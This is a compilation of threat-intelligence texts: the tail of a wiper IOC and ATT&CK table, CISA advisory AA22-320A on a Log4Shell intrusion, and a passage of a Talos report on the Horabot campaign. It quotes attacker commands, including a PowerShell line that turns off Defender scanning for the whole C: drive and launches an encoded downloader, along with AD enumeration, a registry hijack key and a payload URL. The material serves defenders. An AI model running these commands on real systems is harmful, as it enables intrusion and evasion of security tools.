820AD7E30B4C54692D07B29361AECD0BB14DF3BEfantasy45.exeMSIL/KillDisk.
1AAE62ACEE3C04A6728F9EDC3756FABD6E342252host2ip.execleanResolves a hostname to an IP address. 
5485C627922A71B04D4C78FBC25985CDB163313BMiniDump.exeMSIL/Riskware.
LsassDumper.
HImplementation of Mimikatz minidump that dumps credentials from LSASS. 
DB11CBFFE30E0094D6DE48259C5A919C1EB57108registry.batBAT/Agent.
NRGBatch file that wipes some registry keys and is dropped and executed by the Fantasy wiper. 
3228E6BC8C738781176E65EBBC0EB52020A44866secretsdump.pyPython/Impacket.
APython script that dumps credential hashes. 
B3B1EDD6B80AF0CDADADD1EE1448056E6E1B3274spchost.exeMSIL/Agent.
XHSandals lateral movement tool and Fantasy spreader. 
MITRE ATT&CK techniques This table was built using version 12 of the MITRE ATT&CK framework. 
TacticIDNameDescription Resource DevelopmentT1587Develop CapabilitiesAgrius builds utility tools to use during an active exploitation process. 
T1587.001Develop Capabilities: MalwareAgrius builds custom malware including wipers (Fantasy) and lateral movement tools (Sandals). 
Initial AccessT1078.002Valid Accounts: Domain AccountsAgrius operators attempted to capture cached credentials and then use them for lateral movement. T1078.003Valid Accounts: Local AccountsAgrius operators attempted to use cached credentials from local accounts to gain initial access to additional systems within an internal network. 
ExecutionT1059.003Command and Scripting Interpreter:
Windows Command ShellFantasy and Sandals both use batch files that run via the Windows command shell. Privilege EscalationT1134Access Token ManipulationFantasy uses the LookupPrivilegeValue and AdjustTokenPrivilege APIs in advapi32.dll to grant its process token the SeShutdownPrivilege to reboot Windows. 
Defense EvasionT1070.006Indicator Removal on Host: TimestompAgrius operators timestomped the compilation timestamps of Fantasy and Sandals. 
Credential AccessT1003OS Credential DumpingAgrius operators used several tools to dump OS credentials for use in lateral movement. 
DiscoveryT1135Network Share DiscoveryAgrius operators used cached credentials to check for access to other systems within an internal network. 
Lateral MovementT1021.002Remote Services: SMB/Windows Admin SharesAgrius operators used cached credentials to connect over SMB to systems within an exploited internal network. 
T1570Lateral Tool TransferAgrius operators used Sandals to push batch files over SMB to other systems within an internal network. 
ImpactT1485Data DestructionThe Fantasy wiper overwrites data in files and then deletes the files. 
T1561.002Disk WipeFantasy wipes the MBR of the Windows drive and attempts to wipe the OS partition. 
T1561.001Disk Wipe: Disk Content WipeFantasy wipes all disk contents from non-Windows drives that are fixed drives. 
T1529System Shutdown/RebootFantasy reboots the system after completing its disk and data wiping payloads. 
Appendix File extensions (682) targeted by Fantasy wiper when not targeting all file extensions.
File extensions highlighted in yellow (68) are common filename extensions in Windows.
Notably absent are file extensions dll and sys. $$$blenddrwjspnyfqualsoftcodetdb $dbblend1dsbkb2oabquicken2015backuptex 001blend2dsskbxobjquicken2016backuptga 002blobdtdkc2obkquicken2017backupthm 003bm3dwgkdbodbquickenbackuptib 113bmkdxbkdbxodcqv~tibkp 3dmbookexportdxfkdcodfr3dtif 3dsbpadxgkeyodgraftig 3frbpbem1kfodmrartis 3g2bpmepkkpdxodprattlg 3gpbpnepslayoutodsrawtmp 3prbpserbsqllbfodtrbtmr 73bbpwerflcboebrbctor 7zbsaesmldabakoggrbftrn __abupexelitemodoilrbkttbk __bcexfllxoldrbstxt abcaafbclnkonepkgrdbuci ab4casfbfltxorfre4upk abacbkfbkluaorirgss3av2i abbucbsfbulvlorigrimvb abfcbufbwmostrmvbk abkcdffdbm2otgrmbakvbm abucdrffm3uothrmgbvbox-prev abu1cdr3ffdm4aotproflvcf accdbcdr4fffm4votsrrrvdf accdecdr5fhmapottrtfvfs0 accdrcdr6fhdmaxoyxrw2vmdk accdtcdrwfhfmbfp12rwlvob achcdxflambkp7brwzvpcbackup acpce2flatmbwp7cs3dbvpk acrcelflkamcmetapabsafenotebackupvpp_pc actcenon~flkbmdbpagessas7bdatvrb adbcerflvmdbackuppaksavvtf adicfpfmbmdcpaqsayw01 adscfrforgemddatapassbw3x aeacgmfosmdfpatsbbwallet aficibfpkmdinfopbasbswalletx agdlck9fpsxmefpbbsbuwar aiclassfpxmempbdsdOwav aitclsfshmenupbfsdawb2 alcmfftmbmfwpbjsdcwbb apjcmtfulmigpblsdfwbcat apkconfigfwbackupmkvpbx5scriptsidwbk arccpifxgmlxpbxscriptsiddwbx arch00cppfzammwpcdsidnwin arwcr2fzbmoneywellpctsiewjf as4crawgb1mospdbsimwma asdcrdsgb2movpddsiswmo asfcrtgbpmp3pdfskbwmv ashbakcrwgdbmp4pefsldmwotreplay asmcsghompbpemsldxwpb asmxcsdghsmpegpfislmwpd aspcshgraympgpfxslnwps aspxcslgreympqgephpsmewspak assetcsmgrymrwphp5sn1wxwanam asvcssgs-bckmrwrefphtmlsn2x asvxcsvgzmsgpk7snax11 asxd3dbsphmsipkpasssnsx3f ateda0hbkmsimplsnxxbk atidachkdbmv_plcspfxf avidashkxmydplcspgxis awgdashhplgmynotesbackuppngspixla ba6daziphppnb7potspsxlam ba7dbhtmnbapotmsqbxlk ba8db-journalhtm1nbakpotxsqlxlm ba9db0htmlnbdppamsqlitexlr bacdb3hvplnbdppssqlite3xls backdbaibanknbfppsmsqlitedbxlsb backupdbfibdnbippsxsr2xlsm backup1dbkibknbkpptsrfxlsx backupdbdbsibznbspptmsrrxlt bakdbxicbunbupptxsrtxltm bak2dc2icfncfpqb-backupsrwxltx bak3dcricxsncoprfst4xlw bakxdcsidxndprvst6xml bak~dddiifndapsst7ycbcra bankddociiqnddpsast8yrcbck barddrwincpasnefpsafe3stdyuv batddsinddnfbpsdstgzbfx bayderindexnfcpskstizip bbbdesinprogressnk2pspimagestwztmp bbzdescipdnoppststx~cw bc6designisonoyptbsty bc7dgcitdbnpfptxsum bckdimitlnpspvcsv$ bckpdivxitmnrbakpvhdsv2i bcmdiyiv2inrspysvg bdbdjvuiwdnrwqbaswf bffdmpiwins2qbbsxc bgtdnaj01ns3qbksxd bifdngjarns4qbmsxg bifxdocjavansdqbmbsxi bigdocmjbknsfqbmdsxm bikdocxjdcnsgqbrsxw bk1dotjpanshqbwsyncdb bkcdotmjpentlqbxt12 bkfdotxjpegnwbqbyt13 bkpdovjpgnwbakqdftar bkupdpbjpsnx2qictax bkzdrfjsnxlqsftbk 7 Dec 2022 - 11:30AM 
title: AA22-320A: Iranian Government-Sponsored APT Actors Compromise Federal Network, Deploy Crypto Miner, Credential Harvester url: https://us-cert.cisa.gov/ncas/alerts/aa22-320a Original release date: November 16, 2022 | Last revised: November 25, 2022SummaryFrom mid-June through mid-July 2022, CISA conducted an incident response engagement at a Federal Civilian Executive Branch (FCEB) organization where CISA observed suspected advanced persistent threat (APT) activity.
In the course of incident response activities, CISA determined that cyber threat actors exploited the Log4Shell vulnerability in an unpatched VMware Horizon server, installed XMRig crypto mining software, moved laterally to the domain controller (DC), compromised credentials, and then implanted Ngrok reverse proxies on several hosts to maintain persistence.
CISA and the Federal Bureau of Investigation (FBI) assess that the FCEB network was compromised by Iranian government-sponsored APT actors. 
CISA and FBI are releasing this Cybersecurity Advisory (CSA) providing the suspected Iranian government-sponsored actors’ tactics, techniques, and procedures (TTPs) and indicators of compromise (IOCs) to help network defenders detect and protect against related compromises. 
CISA and FBI encourage all organizations with affected VMware systems that did not immediately apply available patches or workarounds to assume compromise and initiate threat hunting activities.
If suspected initial access or compromise is detected based on IOCs or TTPs described in this CSA, CISA and FBI encourage organizations to assume lateral movement by threat actors, investigate connected systems (including the DC), and audit privileged accounts.
All organizations, regardless of identified evidence of compromise, should apply the recommendations in the Mitigations section of this CSA to protect against similar malicious cyber activity. 
For more information on Iranian government-sponsored Iranian malicious cyber activity, see CISA’s Iran Cyber Threat Overview and Advisories webpage and FBI’s Iran Threats webpage. 
Download the PDF version of this report: pdf, 528 kb. 
For a downloadable copy of the Malware Analysis Report (MAR) accompanying this report, see: MAR 10387061-1.v1. 
For a downloadable copy of IOCs, see: AA22-320A.stix, 1.55 mb. 
Technical DetailsNote: This advisory uses the MITRE ATT&CK for Enterprise framework, version 11.
See the MITRE ATT&CK Tactics and Techniques section for a table of the threat actors’ activity mapped to MITRE ATT&CK:registered: tactics and techniques with corresponding mitigation and/or detection recommendations. 
Overview In April 2022, CISA conducted retrospective analysis using EINSTEIN—an FCEB-wide intrusion detection system (IDS) operated and monitored by CISA—and identified suspected APT activity on an FCEB organization’s network.
CISA observed bi-directional traffic between the network and a known malicious IP address associated with exploitation of the Log4Shell vulnerability (CVE-2021-44228) in VMware Horizon servers.
In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity.
Specifically, CISA observed HTTPS activity from IP address to the organization’s VMware server.
Based on trusted third-party reporting, is a Lightweight Directory Access Protocol (LDAP) server associated with threat actors exploiting Log4Shell.
Following HTTPS activity, CISA observed a suspected LDAP callback on port 443 to this IP address.
CISA also observed a DNS query for that resolved back to when the victim server was returning this Log4Shell LDAP callback to the actors’ server. 
CISA assessed that this traffic indicated a confirmed compromise based on the successful callback to the indicator and informed the organization of these findings; the organization investigated the activity and found signs of compromise.
As trusted-third party reporting associated Log4Shell activity from with lateral movement and targeting of DCs, CISA suspected the threat actors had moved laterally and compromised the organization’s DC. From mid-June through mid-July 2022, CISA conducted an onsite incident response engagement and determined that the organization was compromised as early as February 2022, by likely Iranian government-sponsored APT actors who installed XMRig crypto mining software.
The threat actors also moved laterally to the domain controller, compromised credentials, and implanted Ngrok reverse proxies. 
Threat Actor Activity In February 2022, the threat actors exploited Log4Shell [T1190] for initial access [TA0001] to the organization’s unpatched VMware Horizon server.
As part of their initial exploitation, CISA observed a connection to known malicious IP address lasting 17.6 seconds. 
The actors’ exploit payload ran the following PowerShell command [T1059.001] that added an exclusion rule to
Windows Defender
[T1562.001]: powershell try{Add-MpPreference -ExclusionPath 'C:\'; Write-Host 'added-exclusion'} catch {Write-Host 'adding-exclusion-failed' }; powershell -enc "$BASE64 encoded payload to download next stage and execute it" The exclusion rule allowlisted the entire , enabling threat actors to download tools to the without virus scans.
The exploit payload then downloaded from to [T1105].
When executed, mde.ps1 downloaded from and removed from the disk [T1070.004]. contained XMRig cryptocurrency mining software and associated configuration files. 
– XMRig Miner driver – XMRig Miner – XMRig miner configuration – Associated file.
This file can create a local user account
[T1136.001] and tests for internet connectivity by pinging [T1016.001].
The exploit payload created a Scheduled Task
[T1053.005] that executed daily as .
Note:
By exploiting Log4Shell, the actors gained access to a VMware service account with administrator and system level access.
The Scheduled Task was named to masquerade as a legitimate Windows task. 
See MAR 10387061-1.v1 for additional information, including IOCs, on these four files. 
After obtaining initial access and installing XMRig on the VMWare Horizon server, the actors used RDP [T1021.001] and the built-in Windows user account 
[T1078.001] to move laterally [TA0008] to a VMware VDI-KMS host.
Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from server associated with .
The actors downloaded the following tools: PsExec – a Microsoft signed tool for system administrators. 
Mimikatz – a credential theft tool. 
Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain, which the user can then access at a randomly generated subdomain at .
CISA has observed this tool in use by some commercial products for benign purposes; however, this process bypasses typical firewall controls and may be a potentially unwanted application in production environments.
Ngrok is known to be used for malicious purposes.[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator account
[T1136.002].
Using the newly created account, the actors leveraged RDP to propagate to several hosts within the network.
Upon logging into each host, the actors manually disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.
The threat actors were able to implant Ngrok on multiple hosts to ensure Ngrok’s persistence should they lose access to a machine during a routine reboot.
The actors were able to proxy [T1090] RDP sessions, which were only observable on the local network as outgoing HTTPS port 443 connections to and (the prior domain in reverse).
It is possible, but was not observed, that the threat actors configured a custom domain, or used other Ngrok tunnel domains, wildcarded here as , , , or . 
Once the threat actors established a deep foothold in the network and moved laterally to the domain controller, they executed the following PowerShell command on the Active Directory to obtain a list of all machines attached to the domain [T1018]: Powershell.exe get-adcomputer -filter * -properties * | select name,operatingsystem,ipv4address &gt; The threat actors also changed the password for the local administrator account
[T1098] on several hosts as a backup should the rogue domain administrator account get detected and terminated.
Additionally, the threat actor was observed attempting to dump the Local Security Authority Subsystem Service (LSASS) process [T1003.001] with task manager but this was stopped by additional anti-virus the FCEB organization had installed. MITRE ATT&CK TACTICS AND TECHNIQUES See table 1 for all referenced threat actor tactics and techniques in this advisory, as well as corresponding detection and/or mitigation recommendations.
For additional mitigations, see the Mitigations section. 
Table 1: Cyber Threat Actors ATT&CK Techniques for Enterprise Initial Access Technique Title ID Use Recommendations Exploit Public-Facing Application T1190 The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server. 
Mitigation/Detection: Use a firewall or web-application firewall and enable logging to prevent and detect potential Log4Shell exploitation attempts [M1050]. 
Mitigation: Perform regular vulnerability scanning to detect Log4J vulnerabilities and update Log4J software using vendor provided patches
[M1016],[M1051]. Execution Technique Title ID Use Recommendation Command and Scripting Interpreter: PowerShell T1059.001 The actors ran PowerShell commands that added an exclusion rule to Windows Defender. 
The actors executed PowerShell on the AD to obtain a list of machines on the domain. 
Mitigation: Disable or remove PowerShell for non-administrative users [M1042],[M1026] or enable code-signing to execute only signed scripts [M1045]. 
Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049]. 
Persistence Technique Title ID Use Recommendations Account Manipulation T1098 The actors changed the password for the local administrator account on several hosts. 
Mitigation: Use multifactor authentication for user and privileged accounts [M1032]. Detection:
Monitor events for changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728, and 4670.
Monitor for modification of accounts in correlation with other suspicious activity [DS0002]. 
Create Account: Local Account T1136.001 
The actors’ malware can create local user accounts. 
Mitigation: Configure access controls and firewalls to limit access to domain controllers and systems used to create and manage accounts. 
Detection:
Monitor executed commands and arguments for actions that are associated with local account creation, such as net user /add , useradd, and dscl -create
[DS0017]. Detection:
Enable logging for new user creation
[DS0002]. Create Account:
Domain Account T1136.002 
The actors used Mimikatz to create a rogue domain administrator account. 
Enable logging for new user creation, especially domain administrator accounts
[DS0002]. Scheduled Task/Job: Scheduled Task T1053.005 
The actors’ exploit payload created Scheduled Task RuntimeBrokerService.exe, which executed RuntimeBroker.exe daily as SYSTEM. 
Mitigation: Configure settings for scheduled tasks to force tasks to run under the context of the authenticated account instead of allowing them to run as SYSTEM
[M1028]. Detection:
Monitor for newly constructed processes and/or command-lines that execute from the svchost.exe in Windows 10 and the Windows Task Scheduler taskeng.exe for older versions of Windows [DS0009] Detection:
Monitor for newly constructed scheduled jobs by enabling the Microsoft-Windows-TaskScheduler/Operational setting within the event logging service
[DS0003]. Valid Accounts: Default Accounts T1078.001 
The actors used built-in Windows user account DefaultAccount. 
Mitigation: Change default usernames and passwords immediately after the installation and before deployment to a production environment [M1027]. Detection:
Develop rules to monitor logon behavior across default accounts that have been activated or logged into [DS0028]. Defense Evasion Technique Title ID Use Recommendations Impair Defenses: Disable or Modify Tools T1562.001 
The actors added an exclusion rule to Windows Defender.
The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive. 
The actors manually disabled Windows Defender via the GUI. 
Mitigation: Ensure proper user permissions are in place to prevent adversaries from disabling or interfering with security services.
[M1018]. Detection:
Monitor for changes made to Windows Registry keys and/or values related to services and startup programs that correspond to security tools such as HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender
[DS0024]. Detection:
Monitor for telemetry that provides context for modification or deletion of information related to security software processes or services such as Windows Defender definition files in Windows and System log files in Linux [DS0013]. Detection:
Monitor processes for unexpected termination related to security tools/services [DS0009]. 
Indicator Removal on Host: File Deletion T1070.004 
The actors removed malicious file mde.ps1 from the dis. Detection:
Monitor executed commands and arguments for actions that could be utilized to unlink, rename, or delete files [DS0017]. Detection:
Monitor for unexpected deletion of files from the system [DS0022]. 
Credential Access Technique Title ID Use Recommendations OS Credential Dumping: LSASS Memory T1003.001 
The actors were observed trying to dump LSASS process. 
Mitigation: With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping [M1043] Mitigation: On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing [M1040]. 
Mitigation: Ensure that local administrator accounts have complex, unique passwords across all systems on the network [M1027]. Detection:
Monitor for unexpected processes interacting with LSASS.exe. 
Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored.
[DS0009]. Detection:
Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the LSASS
[DS0017]. Credentials from Password Stores T1555 The actors used Mimikatz to harvest credentials. 
Mitigation: Organizations may consider weighing the risk of storing credentials in password stores and web browsers.
If system, software, or web browser credential disclosure is a significant concern, technical controls, policy, and user training may be used to prevent storage of credentials in improper locations [M1027]. 
Monitor for processes being accessed that may search for common password storage locations to obtain user credentials [DS0009]. 
Monitor executed commands and arguments that may search for common password storage locations to obtain user credentials [DS0017]. 
Discovery Technique Title ID Use Recommendations Remote System Discovery T1018 
The actors executed a PowerShell command on the AD to obtain a list of all machines attached to the domain. 
Monitor executed commands and arguments that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0017]. Detection:
Monitor for newly constructed network connections associated with pings/scans that may attempt to get a listing of other systems by IP address, hostname, or other logical identifier on a network that may be used for lateral movement [DS0029]. 
Monitor for newly executed processes that can be used to discover remote systems, such as ping.exe and tracert.exe, especially when executed in quick succession [DS0009]. System Network Configuration Discovery: Internet Connection Discovery T1016.001 The actors’ malware tests for internet connectivity by pinging 8.8.8.8. Mitigation: Monitor executed commands, arguments [DS0017] and executed processes (e.g., tracert or ping)
[DS0009] that may check for internet connectivity on compromised systems. 
Lateral Movement Technique Title ID Use Recommendations Remote Services:
Remote Desktop Protocol T1021.001 The actors used RDP to move laterally to multiple hosts on the network. 
Mitigation: Use MFA for remote logins [M1032]. 
Mitigation: Disable the RDP service if it is unnecessary [M1042]. 
Mitigation: Do not leave RDP accessible from the internet.
Enable firewall rules to block RDP traffic between network security zones within a network [M1030]. 
Mitigation: Consider removing the local Administrators group from the list of groups allowed to log in through RDP
[M1026]. 
Monitor for user accounts logged into systems associated with RDP (ex: Windows EID 4624 Logon Type 10).
Other factors, such as access patterns (ex: multiple systems over a relatively short period of time) and activity that occurs after a remote login, may indicate suspicious or malicious behavior with RDP [DS0028]. Command and Control Technique Title ID Use Recommendations Proxy T1090 The actors used Ngrok to proxy RDP connections and to perform command and control. 
Mitigation: Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists
[M1037]. Detection:
Monitor and analyze traffic patterns and packet inspection associated to protocol(s) that do not follow the expected protocol standards and traffic flows (e.g., extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure)
[DS0029]. Ingress Tool Transfer T1105 
The actors downloaded malware and multiple tools to the network, including PsExec, Mimikatz, and Ngrok. 
Mitigation: Employ anti-malware to automatically detect and quarantine malicious scripts [M1049]. 
INCIDENT RESPONSE If suspected initial access or compromise is detected based on IOCs or TTPs in this CSA, CISA encourages organizations to assume lateral movement by threat actors and investigate connected systems and the DC. 
CISA recommends organizations apply the following steps before applying any mitigations, including patching. 
Immediately isolate affected systems. 
Collect and review relevant logs, data, and artifacts.
Take a memory capture of the device(s) and a forensic image capture for detailed analysis. 
Consider soliciting support from a third-party incident response organization that can provide subject matter expertise to ensure the actor is eradicated from the network and to avoid residual issues that could enable follow-on exploitation. 
Report incidents to CISA via CISA’s 24/7 Operations Center (report@cisa.gov or 888-282-0870) or your local FBI field office, or
FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at CyWatch@fbi.gov. MitigationsCISA and FBI recommend implementing the mitigations below and in Table 1 to improve your organization's cybersecurity posture on the basis of threat actor behaviors. 
Install updated builds to ensure affected VMware Horizon and UAG systems are updated to the latest version. 
If updates or workarounds were not promptly applied following VMware’s release of updates for Log4Shell in December 2021, treat those VMware Horizon systems as compromised.
Follow the pro-active incident response procedures outlined above prior to applying updates.
If no compromise is detected, apply these updates as soon as possible. 
See VMware Security Advisory VMSA-2021-0028.13 and VMware Knowledge Base (KB) 87073 to determine which VMware Horizon components are vulnerable. 
Note: Until the update is fully implemented, consider removing vulnerable components from the internet to limit the scope of traffic.
While installing the updates, ensure network perimeter access controls are as restrictive as possible. 
If upgrading is not immediately feasible, see KB87073 and KB87092 for vendor-provided temporary workarounds.
Implement temporary solutions using an account with administrative privileges.
Note that these temporary solutions should not be treated as permanent fixes; vulnerable components should be upgraded to the latest build as soon as possible. 
Prior to implementing any temporary solution, ensure appropriate backups have been completed. 
Verify successful implementation of mitigations by executing the vendor supplied script without parameters to ensure that no vulnerabilities remain.
See KB87073 for details. 
Keep all software up to date and prioritize patching known exploited vulnerabilities (KEVs). 
Minimize the internet-facing attack surface by hosting essential services on a segregated DMZ, ensuring strict network perimeter access controls, and not hosting internet-facing services that are not essential to business operations.
Where possible, implement regularly updated web application firewalls (WAF) in front of public-facing services.
WAFs can protect against web-based exploitation using signatures and heuristics that are likely to block or alert on malicious traffic. 
Use best practices for identity and access management (IAM) by implementing phishing resistant multifactor authentication (MFA), enforcing use of strong passwords, regularly auditing administrator accounts and permissions, and limiting user access through the principle of least privilege.
Disable inactive accounts uniformly across the AD, MFA systems, etc. 
If using Windows 10 version 1607 or Windows Server 2016 or later, monitor or disable Windows , also known as the Default System Managed Account (DSMA). 
Audit domain controllers to log successful Kerberos Ticket Granting Service (TGS) requests and ensure the events are monitored for anomalous activity. 
Secure accounts. 
Enforce the principle of least privilege.
Administrator accounts should have the minimum permission necessary to complete their tasks. 
Ensure there are unique and distinct administrative accounts for each set of administrative tasks. 
Create non-privileged accounts for privileged users and ensure they use the non-privileged accounts for all non-privileged access (e.g., web browsing, email access). 
Create a deny list of known compromised credentials and prevent users from using known-compromised passwords. 
Secure credentials by restricting where accounts and credentials can be used and by using local device credential protection features. 
Use virtualizing solutions on modern hardware and software to ensure credentials are securely stored. 
Ensure storage of clear text passwords in LSASS memory is disabled.
Note: For Windows 8, this is enabled by default.
For more information see Microsoft Security Advisory Update to Improve Credentials Protection and Management. Consider disabling or limiting NTLM and WDigest Authentication. 
Implement Credential Guard for Windows 10 and Server 2016 (refer to Microsoft: Manage Windows Defender Credential Guard for more information).
For Windows Server 2012R2, enable Protected Process Light for Local Security Authority (LSA). 
Minimize the AD attack surface to reduce malicious ticket-granting activity.
Malicious activity such as “Kerberoasting” takes advantage of Kerberos’ TGS and can be used to obtain hashed credentials that threat actors attempt to crack. 
VALIDATE SECURITY CONTROLS 
In addition to applying mitigations, CISA and FBI recommend exercising, testing, and validating your organization's security program against the threat behaviors mapped to the MITRE ATT&CK for Enterprise framework in this advisory.
CISA and FBI recommend testing your existing security controls inventory to assess how they perform against the ATT&CK techniques described in this advisory. 
To get started: Select an ATT&CK technique described in this advisory (see table 1). 
Align your security technologies against the technique. 
Test your technologies against the technique. 
Analyze your detection and prevention technologies performance. 
Repeat the process for all security technologies to obtain a set of comprehensive performance data. 
Tune your security program, including people, processes, and technologies, based on the data generated by this process. 
CISA and FBI recommend continually testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE ATT&CK techniques identified in this advisory. 
References [1] MITRE ATT&CK Version 11: Software – Ngrok Revisions Initial Version: November 16, 2022 
This product is provided subject to this Notification and this Privacy & Use policy. 
title: New Horabot campaign targets the Americas url: https://blog.talosintelligence.com/new-horabot-targets-americas/ Cisco Talos has observed a threat actor deploying a previously unidentified botnet program Talos is calling “Horabot,” which delivers a known banking trojan and spam tool onto victim machines in a campaign that has been ongoing since at least November 2020.The threat actor appears to be targeting Spanish-speaking users in the Americas and, based on our analysis, may be located in Brazil.
Horabot enables the threat actor to control the victim’s Outlook mailbox, exfiltrate contacts’ email addresses, and send phishing emails with malicious HTML attachments to all addresses in the victim’s mailbox.
The banking trojan can collect the victim’s login credentials for various online accounts, operating system information and keystrokes.
It also steals one-time security codes or soft tokens from the victim’s online banking applications.
The spam tool compromises Yahoo, Gmail and Outlook webmail accounts, enabling the threat actor to take control of those mailboxes, exfiltrate their contacts’ email addresses, and send spam emails.
VictimologyThe attacks predominantly target users in Mexico, with a few infections in Uruguay, Brazil, Venezuela, Argentina, Guatemala and Panama.
In analyzing the phishing emails used in the campaign, Talos identified that users in organizations across several business verticals — including accounting, construction and engineering, wholesale distributing and investment firms — have been affected.
However, the attacker uses Horabot and the spam tool in this campaign to further propagate the attack by sending additional phishing emails to the victim’s contacts, meaning Spanish-speaking users from organizations in additional verticals are likely also affected.
Attacker infrastructure dates back to Nov. 2020Talos discovered that the attacker in this campaign is using multiple hosts, including an Amazon Web Services (AWS) Elastic Compute Cloud (EC2) instance, accessed through its public URL, to host the malicious files.
During our analysis, Talos observed that a malicious server at IP address 185[.]45[.]195[.]226 hosted the PowerShell downloader script and had an open directory that the attacker eventually disabled.
Another malicious server, 216[.]238[.]70[.]224, hosted the ZIP file containing the payloads.
This is most likely a virtual private server (VPS) behind which the attacker has parked the actual command and control (C2) server, leaving us unable to identify the actual C2.
The attacker also used lookalike domains in this campaign to carry out malicious activities and evade network detection.
Based on Talos’ analysis of the domain registration information for the attacker’s infrastructure, Talos assesses with high confidence that this campaign began in November 2020 and has been ongoing through 2023.
According to WHOIS records for the domain tributaria[.]website, used in this campaign to host the attacker’s tools as well as exfiltrated data, the domain was registered in July 2022 and the registrant was based out of Brazil.
This domain name also resembled the legitimate Mexican Tax Agency domain, a tactic the attacker likely adopted to disguise malicious traffic.
The DNS requests to tributaria[.]website, as observed in Cisco Umbrella, are shown below.
In analyzing the SSL certificates of tributaria[.]website, we spotted that the certificates with serial numbers 03b6b83943ec043082a8614186921afa306b and 03eeab4d2874f31ee662ea7f602b73b05633 are shared with four other domains.
Based on our analysis of the domain registration period and the URLs associated with the four domains, they belong to the same campaign that has been ongoing since at least November 2020.Malicious domainsRegistration periodm9b4s2[.]site November 2020tributaria[.]websiteJuly
2022wiqp[.]xyzAugust 2022ckws[.]infoJanuary 2023amarte[.]store March 2023Multi-stage attack chain uses PowerShell downloader and DLL sideloadingThis campaign involves a multi-stage attack chain that begins with a phishing email and leads to payload delivery through the execution of a PowerShell downloader script and sideloading to legitimate executables.
The infection starts with an income tax-themed phishing email written in Spanish, disguising itself as a tax receipt notification and enticing users to open the attached malicious HTML file.
Sample phishing email.
When a victim opens the HTML file attachment, an embedded URL is launched in the victim’s browser, redirecting to another malicious HTML file from an attacker-controlled AWS EC2 instance.
The content displayed on the victim’s browser lures them to click an embedded malicious hyperlink which downloads a RAR file.
Disguised malicious web page.
The RAR file contains a batch file with a CMD extension that is executed when the victim opens the contents of the file.
The batch file downloads the PowerShell downloader script from an attacker-controlled server and executes it through the PowerShell commands.
The PowerShell downloader script will download a ZIP file that contains the payload DLLs and a few legitimate executables and DLLs.
It creates Windows shortcut files configured to run the payloads in the startup folder of the victim’s machine and restarts the machine after 10 seconds.
After the victim’s machine is rebooted, the malicious Windows startup files run the payloads by sideloading them to the legitimate executables and downloading and executing two other PowerShell scripts from a different attacker-controlled server.
One is the PowerShell downloader script, which the attacker attempts to execute to re-infect the victim’s machine, and another is Horabot.
Three-layer infection chain delivers and detonates the payloadsMalicious batch file downloads the PowerShell downloaderThe RAR file containing a malicious batch file with a .cmd extension is downloaded to the user’s machine.
Per the instructions on the HTML page, if the user opens the CMD file, the malicious batch script executes an embedded PowerShell command to download the next-stage PowerShell script from the server and execute it on the victim’s machine.
Downloader batch script.
PowerShell script downloads the payloadsThe malicious PowerShell downloader script launches several processes that download the payloads and reboots the victim’s machine.
The script is heavily obfuscated with random symbols that substitute the instructions during the run-time and base64-encoded strings.
In the initial stage of the execution, the script decodes the base64-encoded strings and initializes them.
It executes a function that uses alphanumeric characters and the special character “_” to generate a random name and creates a folder with the random name in the root directory of the victim’s machine.
The random name generated by the sample during our analysis was “_upyqta2_J”.
The script uses this random name eventually to create other folders and files.
The script creates two other malicious batch scripts with the extension .cmd
in the folder “/Users/Public.”
Then it creates two Windows shortcut files in the Windows startup folder using the Internet Explorer application icon and the target paths pointing to the two dropped batch scripts.
<deskto_name>S.cmd and <desktop_name>Sy.cmd are the naming conventions used.
A snippet of the PowerShell downloader script.
The script also creates three more Windows shortcut files in the victim’s machine startup folder, with the details of the target path pointing to the folders where the payloads are eventually downloaded.
The attacker used the Internet Explorer icon for the dropped shortcut files.
Talos compiled a table showing the malicious Windows shortcut files and their relative paths with the command line arguments.
Shortcut filesRelative pathCommand line arguments_upyqta2_JAA.lnk..\..
\..
\..\_upyqta2_J\_upyqta2_Ji7.exe_upyqta2_JAT.lnk ..
\_upyqta2_J\_upyqta2_J.exeC:\_upyqta2_J\_upyqta2_J.at_upyqta2_JEX.lnk..\..
\_upyqta2_J\_upyqta2_J.exeC:\_upyqta2_J\_upyqta2_J.ai_upyqta2_Jy.lnk..\..
\Public\DESKTOP-UT9NJ4Sy.cmd_upyqta2_J.lnk..\..
\Public\DESKTOP-UT9NJ4S.cmd Next, the script downloads a malicious ZIP file — “m.zip” — from a server using the URL “hxxp[://]216[.]238[.]70[.]224/20/t/e/m.zip” to the random name folder.
The script renames the downloaded file with a random name and deflates its contents.
The deflated contents are renamed using random characters, then the malicious ZIP file is deleted.
The script also writes the path of the executable file, “_upyqta2_Ji7.exe”, to the class’s registry key “HKEY_CURRENT_USER\software\Classes\ms-settings\shell\open\command” and restarts the victim’s machine after 10 seconds using the command “shutdown /r /t
10”.
The deflated contents of the malicious ZIP file are shown in the below table with their description.
Files dropped Description_upyqta2_J.aiCompiled AutoIt script_upyqta2_J.atCompiled AutoIt
